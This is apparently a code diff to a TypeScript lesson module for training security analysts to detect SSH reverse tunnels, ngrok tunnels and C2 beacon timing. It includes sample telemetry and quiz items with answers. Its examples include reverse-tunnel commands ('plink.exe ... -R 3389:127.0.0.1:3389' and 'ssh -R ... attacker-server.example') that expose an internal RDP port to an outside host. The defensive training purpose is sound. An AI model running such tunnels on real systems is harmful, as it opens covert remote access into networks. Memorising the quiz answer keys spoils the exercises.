@@ -27,11 +27,11 @@ const plinkReverseTunnelEvent: TelemetryEvent = {
     path: "C:\\Users\\svc_report\\AppData\\Local\\Temp\\plink.exe",
     parent_name: "cmd.exe",
     parent_pid: 4488,
-    cmdline: "plink.exe -ssh -N -R 3389:127.0.0.1:3389 -P 443 -l relay -pw ******** 45.83.219.11",
+    cmdline: "plink.exe -ssh -N -R 3389:127.0.0.1:3389 -P 443 -l relay -pw ******** 203.0.113.11",
     user: "SOLVIX\\svc_report",
     integrity: "medium",
   },
-  dst_ip: "45.83.219.11",
+  dst_ip: "203.0.113.11",
   dst_port: 443,
   protocol: "tcp",
   description:
@@ -43,17 +43,17 @@ const plinkReverseTunnelEvent: TelemetryEvent = {
     "winlog.event_data.ProcessId": 6120,
     "winlog.event_data.Image": "C:\\Users\\svc_report\\AppData\\Local\\Temp\\plink.exe",
     "winlog.event_data.Product": "PuTTY suite",
-    "winlog.event_data.Company": "Simon Tatham",
+    "winlog.event_data.Company": "PuTTY Project",
     "winlog.event_data.OriginalFileName": "Plink",
     "winlog.event_data.CommandLine":
-      "plink.exe -ssh -N -R 3389:127.0.0.1:3389 -P 443 -l relay -pw ******** 45.83.219.11",
+      "plink.exe -ssh -N -R 3389:127.0.0.1:3389 -P 443 -l relay -pw ******** 203.0.113.11",
     "winlog.event_data.CurrentDirectory": "C:\\Users\\svc_report\\AppData\\Local\\Temp\\",
     "winlog.event_data.User": "SOLVIX\\svc_report",
     "winlog.event_data.IntegrityLevel": "Medium",
-    "winlog.event_data.Hashes": "SHA256=0FEFA5D85E2CC9F24584A763E6F49790F562FDD7B26C82E770212CD1CC91E6F5",
+    "winlog.event_data.Hashes": "SHA256=0fefa5d85e2cc9f24584a763e6f49790f562fdd7b26c82e770212cd1cc91e6f5",
     "winlog.event_data.ParentProcessId": 4488,
     "winlog.event_data.ParentImage": "C:\\Windows\\System32\\cmd.exe",
-    "winlog.event_data.ParentCommandLine": "cmd.exe /c plink.exe -ssh -N -R 3389:127.0.0.1:3389 -P 443 -l relay -pw ******** 45.83.219.11",
+    "winlog.event_data.ParentCommandLine": "cmd.exe /c plink.exe -ssh -N -R 3389:127.0.0.1:3389 -P 443 -l relay -pw ******** 203.0.113.11",
   },
 };
 
@@ -67,7 +67,7 @@ const ngrokBeaconEvent: TelemetryEvent = {
   severity: "high",
   hostname: "SRV-DB07.solvix.local",
   src_ip: "10.40.2.201",
-  dst_ip: "3.15.44.88",
+  dst_ip: "198.51.100.88",
   dst_port: 443,
   protocol: "tcp",
   network: { domain: "8f2a9c1e.ngrok-free.app" },
@@ -75,7 +75,7 @@ const ngrokBeaconEvent: TelemetryEvent = {
     "SRV-DB07, a production database server, has established 58 TLS sessions to 8f2a9c1e.ngrok-free.app over the past 59 minutes",
   raw: {
     "tls.sni": "8f2a9c1e.ngrok-free.app",
-    "destination.ip": "3.15.44.88",
+    "destination.ip": "198.51.100.88",
     "destination.port": 443,
     "network.protocol": "https",
     connections_last_hour: 58,
@@ -110,11 +110,11 @@ const tunnelingRoom = {
         `**Local forwarding (-L): expose a REMOTE service on your LOCAL machine**\n\n` +
         `ssh -L 8080:internal-app:80 jumpbox.example.com opens a listener on YOUR local port 8080; anything you connect to on 127.0.0.1:8080 gets tunneled, through the SSH connection to jumpbox.example.com, and from there out to internal-app:80. This is the common, everyday, legitimate use case: reaching an internal service you don't have direct network access to, via an SSH jump host you do have access to. Attackers use it too: most often to reach an internal target from their own attacker-controlled machine, tunneling through a single compromised host that DOES have the needed network access.\n\n` +
         `**Remote forwarding (-R): expose a LOCAL service to the REMOTE side, the dangerous direction**\n\n` +
-        `ssh -R 3389:127.0.0.1:3389 attacker-server.com does the reverse: it opens a listener on the REMOTE machine (attacker-server.com), and anything connecting to THAT remote listener gets tunneled back through the SSH connection to 127.0.0.1:3389 on the machine that initiated the SSH connection. This is exactly the mechanism behind a reverse tunnel: an internal, compromised host initiates a normal-looking OUTBOUND SSH connection (which most firewalls permit far more readily than inbound connections), and once established, the attacker, sitting on the remote end, can now reach back INTO the internal network through that tunnel, entirely bypassing whatever inbound firewall rules would otherwise have blocked them. The internal host effectively phones home and hands the attacker a door that opens from the outside, without ever requiring an inbound connection to be allowed anywhere.\n\n` +
+        `ssh -R 3389:127.0.0.1:3389 attacker-server.example does the reverse: it opens a listener on the REMOTE machine (attacker-server.example), and anything connecting to THAT remote listener gets tunneled back through the SSH connection to 127.0.0.1:3389 on the machine that initiated the SSH connection. This is exactly the mechanism behind a reverse tunnel: an internal, compromised host initiates a normal-looking OUTBOUND SSH connection (which most firewalls permit far more readily than inbound connections), and once established, the attacker, sitting on the remote end, can now reach back INTO the internal network through that tunnel, entirely bypassing whatever inbound firewall rules would otherwise have blocked them. The internal host effectively phones home and hands the attacker a door that opens from the outside, without ever requiring an inbound connection to be allowed anywhere.\n\n` +
         `**Dynamic forwarding (-D): turn the SSH client into a full SOCKS proxy**\n\n` +
         `ssh -D 1080 jumpbox.example.com doesn't forward one specific port at all. It turns the local machine into a SOCKS proxy listening on port 1080. Any application configured to use that SOCKS proxy (a browser, or, notably, an attacker's own tooling configured via proxychains) can now reach ANY destination reachable from jumpbox.example.com, on ANY port, all tunneled through the single encrypted SSH connection. This is the most flexible and most dangerous mode for an attacker pivoting through a compromised host: rather than pre-selecting one specific service to forward (as -L and -R require), -D gives them arbitrary, on-demand access to the entire network reachable from that pivot point.\n\n` +
         `**Why the network evidence looks almost identical regardless of forwarding mode**\n\n` +
-        `From a pure flow-log perspective, all three modes look like exactly what they are at the transport layer: one long-lived, encrypted TCP connection on port 22 (or, as covered later in this room, sometimes a non-standard port chosen deliberately to blend in). The forwarding TYPE and DIRECTION are not visible in the flow record at all. This is exactly why process-creation telemetry (the actual command line used to invoke ssh or plink, which explicitly states -L, -R, or -D and the exact ports involved) is essential to fully understand what a suspicious long-lived SSH connection is actually being used for.`,
+        `From a pure flow-log perspective, all three modes look like exactly what they are at the transport layer: one long-lived, encrypted TCP connection on port 22 (or, as covered later in this room, sometimes a non-standard port chosen deliberately to blend in). The forwarding TYPE and DIRECTION are not visible in the flow record at all. This is exactly why process-creation telemetry (the actual command line used to invoke ssh or plink, which explicitly states -L, -R, or -D and the exact ports involved) is essential to fully understand what a suspicious long-lived SSH connection is actually being used for. Read those command lines carefully: the numbers inside the -L, -R or -D specification are the forwarded ports, while a separate option (-p in ssh, -P in plink) sets the port the SSH server listens on, and that separate port is the destination port a firewall records for the outer connection.`,
       codeExample:
         "SSH FORWARDING MODES -- SYNTAX AND DIRECTION\n" +
         "=======================================================\n" +
@@ -124,7 +124,7 @@ const tunnelingRoom = {
         "  Use: reach a REMOTE service from HERE\n" +
         "\n" +
         "-R (remote forward) -- THE DANGEROUS DIRECTION\n" +
-        "  ssh -R 3389:127.0.0.1:3389 attacker-server.com\n" +
+        "  ssh -R 3389:127.0.0.1:3389 attacker-server.example\n" +
         "  attacker-server:3389 --tunnel--> HERE:127.0.0.1:3389\n" +
         "  Use: expose a LOCAL service to a REMOTE listener --\n" +
         "  attacker reaches INTO your network via an outbound-\n" +
@@ -293,13 +293,15 @@ const tunnelingRoom = {
         `**Interval: the base sleep time**\n\n` +
         `The beacon's operator configures a **sleep interval** (commonly measured in seconds): how long the implant waits between each check-in to its C2 server. A naive, un-jittered beacon checking in every exactly 60 seconds produces a trivially detectable pattern: plot the time gaps between successive connections to the same destination, and every single gap is (as close to) precisely 60 seconds as network latency allows.\n\n` +
         `**Jitter: randomizing within a band, not eliminating the pattern**\n\n` +
-        `**Jitter** is configured as a percentage that randomizes the actual sleep time around the base interval: a 60-second interval with 20% jitter means each individual sleep is randomly chosen somewhere between 48 seconds (60 minus 20%) and 72 seconds (60 plus 20%), a different random value each time. (Jitter semantics vary by framework: this room uses the symmetric ± convention, but Cobalt Strike, for example, only subtracts (sleep 60 with 20% jitter gives 48–60 seconds) and some frameworks add a random delay on top of the base instead, so confirm the convention before computing a band.) This defeats naive "are all the gaps EXACTLY 60 seconds" detection, but it does NOT make the beacon's timing look like genuinely random human activity, because jitter only randomizes WITHIN a fixed, bounded band. Every single gap, no matter how the random draw comes out, still falls somewhere between 48 and 72 seconds. It can never be 10 seconds, and it can never be 300 seconds, the way genuinely unstructured human browsing behavior naturally would produce.\n\n` +
+        `**Jitter** is configured as a percentage that randomizes the actual sleep time around the base interval: a 60-second interval with 20% jitter means each individual sleep is randomly chosen somewhere between 48 seconds (60 minus 20%) and 72 seconds (60 plus 20%), a different random value each time. (Jitter semantics vary by framework: this room uses the symmetric ± convention, but Cobalt Strike, for example, only subtracts (sleep 60 with 20% jitter gives 48 to 60 seconds) and some frameworks add a random delay on top of the base instead, so confirm the convention before computing a band.) This defeats naive "are all the gaps EXACTLY 60 seconds" detection, but it does NOT make the beacon's timing look like genuinely random human activity, because jitter only randomizes WITHIN a fixed, bounded band. Every single gap, no matter how the random draw comes out, still falls somewhere between 48 and 72 seconds. It can never be 10 seconds, and it can never be 300 seconds, the way genuinely unstructured human browsing behavior naturally would produce.\n\n` +
         `**The statistical detection: deltas cluster in a band, real activity doesn't**\n\n` +
         `An analyst (or an automated tool like RITA, built specifically for this) computes the **inter-arrival deltas** (the time gap between each successive connection from one host to the same destination) across a large enough sample, then looks at the SHAPE of that distribution. A beacon with interval=60/jitter=20% produces deltas that are tightly and evenly clustered somewhere in the 48-72 second band, session after session, hour after hour, essentially indefinitely, for as long as the implant stays alive. Ordinary human-driven traffic to any single destination (even a site someone visits very habitually) does not produce this kind of persistent, bounded clustering; human timing is influenced by actual activity, breaks, meetings, and simple inattention, producing deltas that are far more varied and don't sit in one tight, unchanging band indefinitely.\n\n` +
         `**Worked example**\n\n` +
         `Given ten observed connection timestamps to one destination, compute the nine gaps between them. If every one of those nine gaps falls between 48 and 72 seconds, with no gap dramatically outside that range, and this pattern continues consistently across a much longer observation window (hours, not just ten samples), that is a very high-confidence beacon signature, because the ONLY realistic non-malicious explanation for that kind of sustained, bounded regularity is some form of legitimate, genuinely scheduled automated task (an update checker, a telemetry client, a license-validation service), which is exactly why destination reputation and process attribution (covered in the TLS room's C2 detection reading) still matter as the final piece of the puzzle even after the timing math checks out.\n\n` +
         `**Beacon "score" as a concept**\n\n` +
-        `Detection tools formalize this into a beacon score: a composite metric weighing how tightly deltas cluster (low variance relative to the mean = higher score), how many repetitions have been observed (more repetitions = more statistical confidence), and how consistent the data-size-per-connection is (as covered in the TLS room). A single pair of connections 60 seconds apart proves nothing; dozens of connections sustaining a tight, bounded interval over hours is what turns a coincidence into a confident detection.`,
+        `Detection tools formalize this into a beacon score: a composite metric weighing how tightly deltas cluster (low variance relative to the mean = higher score), how many repetitions have been observed (more repetitions = more statistical confidence), and how consistent the data-size-per-connection is (as covered in the TLS room). A single pair of connections 60 seconds apart proves nothing; dozens of connections sustaining a tight, bounded interval over hours is what turns a coincidence into a confident detection.\n\n` +
+        `**Measuring the spread in a query**\n\n` +
+        `Standard deviation is one number for how far values spread around their average, so a small value means tightly clustered gaps. In KQL (Kusto Query Language, the query language of Microsoft Sentinel and Defender) the aggregation is stdev(column), used inside summarize next to count() and avg(), and when you hunt HTTPS traffic you filter on its standard port, 443.`,
       codeExample:
         "WORKED EXAMPLE: interval=60s, jitter=20% -> band = 48-72s\n" +
         "=======================================================\n" +
@@ -340,7 +342,7 @@ const tunnelingRoom = {
         ],
         answer: 0,
         explanation:
-          "Jitter only randomizes each sleep within a bounded band around the base interval (48–72 seconds for 60 s with symmetric 20% jitter), so the gaps keep clustering inside that band indefinitely, while human timing ranges from seconds to hours. Jitter acts on the sleep time, not on packet sizes, so the gaps do vary. The offsets may average out, but averaging does not make individual gaps equal the base. Each gap still lands anywhere in the band. Human browsing is the less regular of the two, not the more regular, so it is the beacon's tight band, not a wide spread, that gives it away.",
+          "Jitter only randomizes each sleep within a bounded band around the base interval (48 to 72 seconds for 60 s with symmetric 20% jitter), so the gaps keep clustering inside that band indefinitely, while human timing ranges from seconds to hours. Jitter acts on the sleep time, not on packet sizes, so the gaps do vary. The offsets may average out, but averaging does not make individual gaps equal the base. Each gap still lands anywhere in the band. Human browsing is the less regular of the two, not the more regular, so it is the beacon's tight band, not a wide spread, that gives it away.",
       },
     },
 
@@ -358,7 +360,7 @@ const tunnelingRoom = {
       ],
       answer: 2,
       explanation:
-        "With a 90-second interval and symmetric 30% jitter, the band runs from 90 minus 27 (63 seconds) to 90 plus 27 (117 seconds). 66 and 114 seconds sit near the edges but inside the band, and 88 seconds is close to the base, so all three fit. 60 seconds is just below the 63-second floor, reading 30% as ±30 seconds (a 60–120 band) would wrongly accept it. A gap outside the band means either it came from a different cause or the beacon's real configuration differs from what is assumed.",
+        "With a 90-second interval and symmetric 30% jitter, the band runs from 90 minus 27 (63 seconds) to 90 plus 27 (117 seconds). 66 and 114 seconds sit near the edges but inside the band, and 88 seconds is close to the base, so all three fit. 60 seconds is just below the 63-second floor, reading 30% as ±30 seconds (a 60 to 120 band) would wrongly accept it. A gap outside the band means either it came from a different cause or the beacon's real configuration differs from what is assumed.",
       xp: 30,
     },
 
@@ -475,7 +477,7 @@ const tunnelingRoom = {
       content:
         `Every technique in this room produces overlapping but distinguishable evidence across process, network, DNS, and TLS telemetry. This final reading is the checklist that ties them together into a repeatable investigation sequence.\n\n` +
         `**Step 1: Process ancestry and command line**\n\n` +
-        `Start at the endpoint if you have process telemetry available: what launched this connection, and what's the FULL command line? A bare "ssh" or "plink.exe" launch tells you little; the same launch WITH -R 3389:127.0.0.1:3389 visible in the command line tells you exactly what direction and what service is being forwarded, immediately. This single step is often the fastest way to fully understand what a suspicious long-lived connection actually is, and it's information that simply doesn't exist in network-only telemetry at all.\n\n` +
+        `Start at the endpoint if you have process telemetry available: what launched this connection, and what's the FULL command line? A bare "ssh" or "plink.exe" launch tells you little; the same launch WITH -R 3389:127.0.0.1:3389 visible in the command line tells you exactly what direction and what service is being forwarded, immediately. This single step is often the fastest way to fully understand what a suspicious long-lived connection actually is, and it's information that simply doesn't exist in network-only telemetry at all. Note which process owns the connection, too: when it is a core service process such as a database engine or web server, rather than a separate utility, treat it as more severe. The service itself is doing something it was never built to do, which points to attacker code executing through it, for example after an injection flaw.\n\n` +
         `**Step 2: Destination reputation and rarity**\n\n` +
         `Has this destination (IP, domain, or ASN) ever been contacted by any host on your network before? By how many hosts, and how often? A destination that's brand new to your entire environment, contacted by exactly one host, is a very different starting point than a destination your organization has used routinely for months.\n\n` +
         `**Step 3: Connection duration and byte pattern**\n\n` +
@@ -485,7 +487,9 @@ const tunnelingRoom = {
         `**Step 5: Correlate with everything else happening on that host and account**\n\n` +
         `Does this coincide with other suspicious activity: a recent phishing click, an unusual authentication event, a process that shouldn't be there, files recently dropped into an unusual directory (like Temp, as seen with plink.exe in this room's log analysis)? A single, isolated finding is weaker evidence than the same finding appearing alongside two or three other unrelated-looking anomalies on the same host in the same time window.\n\n` +
         `**Step 6: Check for a legitimate explanation BEFORE escalating (verify with the asset/change owner)**\n\n` +
-        `Given how genuinely dual-use every technique and tool in this room is (legitimate SSH tunneling for IT support, legitimate ngrok use by developers, legitimate Chisel use by an approved penetration test, legitimate plink.exe scripting by sysadmins), the final, essential step before treating any of these findings as confirmed malicious is checking for a documented, verifiable business explanation: an open change ticket, a known approved tool deployment, confirmation from the account owner or their manager, or a scheduled penetration test's rules of engagement. This is the industry practice of verifying with the asset or change owner (in this platform, the outcome is recorded as it_verify_result): "confirmed" means a legitimate explanation exists and this is very likely a benign true positive (the detection correctly caught real tool use, and that use is authorized), not a false positive, because nothing misfired; "unverified" (or no ticket found at all) means the finding should be escalated and investigated as a real possibility, not dismissed. Skipping this step in either direction, either escalating every instance of a dual-use tool reflexively, or dismissing every instance because "that tool is sometimes used legitimately", is exactly the failure mode this entire room has been building you toward avoiding.`,
+        `Given how genuinely dual-use every technique and tool in this room is (legitimate SSH tunneling for IT support, legitimate ngrok use by developers, legitimate Chisel use by an approved penetration test, legitimate plink.exe scripting by sysadmins), the final, essential step before treating any of these findings as confirmed malicious is checking for a documented, verifiable business explanation: an open change ticket, a known approved tool deployment, confirmation from the account owner or their manager, or a scheduled penetration test's rules of engagement. This is the industry practice of verifying with the asset or change owner (in this platform, the outcome is recorded as it_verify_result): "confirmed" means a legitimate explanation exists and this is very likely a benign true positive (the detection correctly caught real tool use, and that use is authorized), not a false positive, because nothing misfired; "unverified" (or no ticket found at all) means the finding should be escalated and investigated as a real possibility, not dismissed. Skipping this step in either direction, either escalating every instance of a dual-use tool reflexively, or dismissing every instance because "that tool is sometimes used legitimately", is exactly the failure mode this entire room has been building you toward avoiding.\n\n` +
+        `**When there is no legitimate explanation**\n\n` +
+        `Once a finding has no legitimate explanation and points to an active compromise, contain before you clean: cut the host off from the network while keeping its memory and disk intact as evidence, block the channel at the proxy or firewall, and investigate how the attacker got execution. Blocking one domain leaves the foothold alive, and restarting or reimaging destroys what you need to learn.`,
       codeExample:
         "THE SIX-STEP TUNNELING INVESTIGATION SEQUENCE\n" +
         "=======================================================\n" +
@@ -525,7 +529,7 @@ const tunnelingRoom = {
       id: "tunnel-la1",
       heading: "Investigating an Unfamiliar SSH Client Launch on a Production Server",
       context:
-        "SRV-APP12 is a production application server whose standard software inventory does not include any SSH client tooling. Review the Sysmon process-creation event (Event ID 1) below. SIEM enrichment gathered alongside it: (1) the 90-day process history shows no earlier execution of plink.exe on this host; (2) the firewall flow log shows the TCP session from SRV-APP12 to the destination in the command line still open 15,240 seconds (just over 4 hours) after this event; (3) the EDR's image-load record for the same binary reports its Authenticode signature as valid, signer Simon Tatham (the real PuTTY author).",
+        "SRV-APP12 is a production application server whose standard software inventory does not include any SSH client tooling. Review the Sysmon process-creation event (Event ID 1) below. SIEM enrichment gathered alongside it: (1) the 90-day process history shows no earlier execution of plink.exe on this host; (2) the firewall flow log shows the TCP session from SRV-APP12 to the destination in the command line still open 15,240 seconds (just over 4 hours) after this event; (3) the EDR's image-load record for the same binary reports its Authenticode signature as valid, signer the genuine PuTTY publisher.",
       event: plinkReverseTunnelEvent,
       questions: [
         {
@@ -558,16 +562,16 @@ const tunnelingRoom = {
         },
         {
           question:
-            "The EDR image-load record reports plink.exe's signature as valid, signed by Simon Tatham, the real PuTTY author. How should that change your assessment of this event?",
+            "The EDR image-load record reports plink.exe's signature as valid, signed by the genuine PuTTY publisher. How should that change your assessment of this event?",
           options: [
-            "Lower it: a valid signature from the real author rules out a trojanized binary, which was the main risk in this event",
+            "Lower it: a valid signature from the real publisher rules out a trojanized binary, which was the main risk in this event",
             "Barely: it proves the binary is genuine PuTTY, not that this account, path and -R tunnel are authorized on this host",
             "Raise it: attackers favour stolen signing certificates, so a valid signature on a Temp-folder binary suggests theft",
             "Close it: signed admin tools started by a service account are normally pre-approved, so this is routine IT activity",
           ],
           answer: 1,
           explanation:
-            "As Reading 5 explains, plink.exe's genuine signature is exactly why attackers favour it and why EDR/allowlisting often trusts it: the signature validates the binary, not this execution. The risk here was never a trojanized plink: a genuine copy does the -R forward just as well, so ruling out tampering does not lower severity. Nothing in the evidence points to a stolen certificate (the signer is the real author) so treating the signature as a theft indicator misreads it. And signing says nothing about approval: SRV-APP12's inventory has no SSH tooling, the binary ran from a Temp folder, and it has no history on the host, so it cannot be closed as routine.",
+            "As Reading 5 explains, plink.exe's genuine signature is exactly why attackers favour it and why EDR/allowlisting often trusts it: the signature validates the binary, not this execution. The risk here was never a trojanized plink: a genuine copy does the -R forward just as well, so ruling out tampering does not lower severity. Nothing in the evidence points to a stolen certificate (the signer is the genuine publisher) so treating the signature as a theft indicator misreads it. And signing says nothing about approval: SRV-APP12's inventory has no SSH tooling, the binary ran from a Temp folder, and it has no history on the host, so it cannot be closed as routine.",
           xp: 30,
         },
       ],
@@ -674,7 +678,7 @@ const tunnelingRoom = {
         severity: "low",
         hostname: "WKS-DEV27.solvix.local",
         src_ip: "10.40.6.155",
-        dst_ip: "18.223.101.4",
+        dst_ip: "198.51.100.104",
         dst_port: 443,
         protocol: "tcp",
         network: { domain: "c4a91f.ngrok-free.app" },
@@ -684,7 +688,7 @@ const tunnelingRoom = {
           "WKS-DEV27 established a TLS session with SNI c4a91f.ngrok-free.app during a scheduled sprint demo meeting; connection duration matches the meeting's scheduled length",
         raw: {
           "tls.sni": "c4a91f.ngrok-free.app",
-          "destination.ip": "18.223.101.4",
+          "destination.ip": "198.51.100.104",
           "destination.port": 443,
           "network.protocol": "https",
           connections_last_hour: 1,
